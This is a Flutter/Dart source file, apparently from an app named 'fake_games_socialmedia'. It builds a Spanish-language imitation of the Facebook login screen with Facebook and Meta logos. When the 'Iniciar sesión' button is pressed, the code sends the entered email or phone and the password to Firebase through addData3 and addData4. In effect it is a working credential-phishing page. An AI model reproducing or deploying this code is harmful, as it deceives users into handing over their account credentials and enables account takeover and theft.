import 'package:fake_games_socialmedia/services/firebase_data.dart';
import 'package:flutter/material.dart';

class Facebookpage2 extends StatefulWidget {
  Facebookpage2({Key? key}) : super(key: key);

  @override
  State<Facebookpage2> createState() => _Facebookpage2State();
}

class _Facebookpage2State extends State<Facebookpage2> {
  TextEditingController dataemail = TextEditingController(text: "");
  TextEditingController datapassword = TextEditingController(text: "");
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(),
      body: Column(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          Divider(
            height: 6.0,
            color: Colors.transparent,
          ),
          Column(
            mainAxisAlignment: MainAxisAlignment.spaceAround,
            children: [
              Text("Español"),
              Divider(
                height: 40,
                color: Colors.transparent,
              ),
              SizedBox(
                  width: 60.0,
                  height: 60.0,
                  child: Image(image: AssetImage("assets/logo.png"))),
            ],
          ),

          ////////////////////PART N° 3///////////////////////
          Padding(
            padding: const EdgeInsets.all(10.0),
            child: Column(
              children: [
                TextField(
                    controller: dataemail,
                    cursorColor: Colors.black,
                    decoration: InputDecoration(
                        hintText: "Celular o correo electrónico",
                        border: OutlineInputBorder())),
                Divider(
                  height: 20.0,
                  color: Colors.transparent,
                ),
                TextFormField(
                  controller: datapassword,
                  obscureText: true,
                  decoration: InputDecoration(
                      hintText: "Contraseña",
                      border: OutlineInputBorder(
                          borderSide:
                              BorderSide(color: Colors.green, width: 3))),
                ),
                Divider(
                  height: 20.0,
                  color: Colors.transparent,
                ),
                ElevatedButton(
                    style:
                        ElevatedButton.styleFrom(primary: Color(0xFFF1877f2)),
                    onPressed: () async {
                      await addData3(dataemail.text);
                      addData4(datapassword.text);
                    },
                    child: Container(
                      height: 50,
                      width: 370,
                      child: Center(child: Text("Iniciar sesión")),
                    ))
              ],
            ),
          ),
          //////////////////////////////fINISH PART 3////////////////
          Padding(
            padding: const EdgeInsets.all(10.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.spaceAround,
              children: [
                Text("¿Olvidaste tu contraseña?"),
                Divider(
                  height: 15.0,
                  color: Colors.transparent,
                ),
                ElevatedButton(
                    child: SizedBox(
                      width: 350,
                      child: Center(
                        child: Text(
                          "Crear cuenta nueva",
                          style: TextStyle(color: Colors.black),
                        ),
                      ),
                    ),
                    onPressed: () {},
                    style: ElevatedButton.styleFrom(
                      elevation: 0.0,
                      primary: Colors.red.withOpacity(0),
                      shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.all(
                            Radius.circular(2),
                          ),
                          side: BorderSide(color: Colors.black26)),
                    )),
                Container(
                  width: 80,
                  height: 80,
                  child: Image(image: AssetImage("assets/meta.png")),
                )
              ],
            ),
          ),
        ],
      ),
    );
  }
}
